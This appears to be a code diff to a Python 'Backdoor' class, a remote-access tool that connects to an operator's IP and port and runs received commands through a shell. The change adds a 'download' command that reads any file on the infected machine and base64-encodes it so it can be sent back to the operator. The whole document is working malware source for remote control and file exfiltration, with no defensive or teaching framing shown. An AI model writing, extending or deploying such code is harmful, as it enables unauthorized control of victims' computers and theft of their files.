@@ -1,5 +1,5 @@
 import socket
-import subprocess,json, os
+import subprocess,json, os, base64
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -23,6 +23,10 @@ class Backdoor:
         os.chdir(path)
         return "[+] CHanging Path to " + path
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def run_system_commands(self, command):
         return subprocess.check_output(command, shell=True)
 
@@ -34,6 +38,8 @@ class Backdoor:
                 exit()
             elif command[0] == "cd" and len(command) > 1:
                 self.change_path(command[1])
+            elif command[0] == "download":
+                command_result = self.read_file(command[1])
             else:
                 command_result = self.run_system_commands(command)
             
